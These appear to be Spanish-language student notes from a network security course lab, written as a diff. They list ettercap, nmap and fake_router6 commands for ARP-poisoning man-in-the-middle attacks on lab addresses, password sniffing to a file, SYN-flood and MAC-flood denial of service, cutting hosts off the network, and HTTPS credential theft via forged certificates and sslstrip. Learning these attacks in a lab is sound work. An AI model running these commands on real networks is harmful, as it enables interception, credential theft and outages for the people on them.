@@ -1,0 +1,186 @@
+APUNTES LSI
+
+ettercap  
+apt-cache search sniffer
+apt-get install ettercap ettercap-gtk
+
+su -p root
+xhosts +localhost # Hace un disable de la autenticion de la x de localhost 
+ettercap -G # Se llama al Gtk (entorno grafico)
+
+gksu ettercap -G 
+gksu Wireshark 
+su-to-root -X -c /usr/bin/Wireshark
+
+
+
+
+ettecap -T -P repoison_arp -M arp:remote /10.10.102.50/ /10.10.102.5/
+	-T #Mostrar paqueteria por pantalla 
+	-P #Ejecutar plugin 
+	repoison_arp #Envenena continuamente
+	-M #Tipo de ataque 
+		arp #Ataque
+		remote # Cojemos el trafico que viene de atras, de internet
+	/ip-victima/ /ip-router/ # // // sniffing a todo dios 
+	#Podemos poner -> MAC/IP/PORT 
+		/x.x.x.x/80
+		/x.x.x.x/80,21
+		
+		
+ettercap -T -M srp -l fichero_pass // // #sniffeo toda la paqueteria y almacena en fichero_pass usuario y contraseñas
+
+ettecap -P list 
+#enseña los plugins del ettecap 
+
+ettercap -T -P dos_attack /x.x.x.x//
+Probar: ettercap -T -P dos_attack // 
+# ataque dos 
+
+1) ettecap -T -P repoison_arp -M arp:remote -w fichero /10.10.102.50/ /10.10.102.5/
+2) Abrir el fichero con wireshark 
+#Vamos a ver paqueteria STP, la cual no deberia llegar a nuestra maquina
+#Vamos a ver paqueteria CPHA, (firewall CheckPoint en 10.10.102.4)
+
+ettercap -TQP arp_cop //
+#Reporta actividad ARP sospechosa monitorizando de forma pasiva las peticiones ARP request y replies. Reportaa ARP poisoning, conflictos de ip, cambios de ip. Se puede construir una lista inicial
+
+ettercap -TQP dos_attack /x.x.x.x// 
+#Ataque dos por inundacion SYN, abriendo conexiones, SYN|ACK. previamente hace port scan
+
+ettercap -TQzP find_conn
+
+ettercap -TzqP isolate /x.x.x.x/ // 
+#Aisla una maquina, la deja mangada y sin internet 
+
+ettercap -TP rand_flood
+#flooding de MACs a lo bruto a la LAN.Algunos conmutadores mueren (en switchs etternet). Utilizado en un grupo de switch que utilicen STP
+
+
+DIRECCIONES MAC EN Ipv4
+
+ping -b 10.10.102.225
+#No funciona en nuestra maquina porque no responde a broadcast
+#Podemos hacer un script que recorra de una en una
+
+nmap -sP 10.10.102/24 
+#Escanea maquinas con sus MACs y da mas datos 
+
+nast -m -i eth0 
+#Saca relacion de ips y MACs
+
+
+
+
+DIRECCIONES IPV6 
+alive tun6to4 
+ping6 a direcciones multicast 
+
+VISITAR URLs visitadas por la victima
+ettercap -Tq -M ar:remote -P remote_browser .../
+
+Blog de la asignatura -> reports -> mitm en ipv6
+
+
+Tirar todas las maquinas de la red:
+./fake_router6 eth0 1::/64 
+#Los operativos de autoconfiguran 
+#Manda paqueteria para configurar linklocal 
+
+
+Trabajar con filtros
+Filtrat y modificar
+http://www.irongeek.com/i.php?page=security/ettercapfilter
+
+Para configurar el filtro 
+etterfilter filtro.filter -i filtro.ef
+ettercap -Tq -F ./filtro.ef .M arp_remote -P repoison_arp /x.x.x.x/ /x.x.x.x/
+
+
+ROBAR PASSWD DE SESION HTTPS CIFRADO 
+en etter.conf descomentar
+redir_command_on="iptables -t nat -A PREROUTING -i %iface -p tcp -dport %port -j REDIRECT -to-port %rport
+
+ettercap -C
+hosts - Scan for hosts 
+Hosts - hosts list 
+seleccionar host target 1 
+seleccionar router target 2 
+Mitm - Arp poisoning - de tipo remoto 
+Start - start sniffing 
+
+#Funciona falsificando un certificado 
+
+
+OTRO -> sslstrip
+
+INTERNET <--https-- YO <--http-- Victima 
+#No se entera de que es hhtp, en el navegador muestra que es https (con el candado y to)
+
+FIREWALL DNS Y DEBIAN -> Fingerprintig de sistema operativo 
+
+
+MONITORIZAR TRAFICO DE RED 
+iftop 
+vnstat
+	- l -u -i eth0 
+	-u -i eth0 (crea la base de datos) 
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
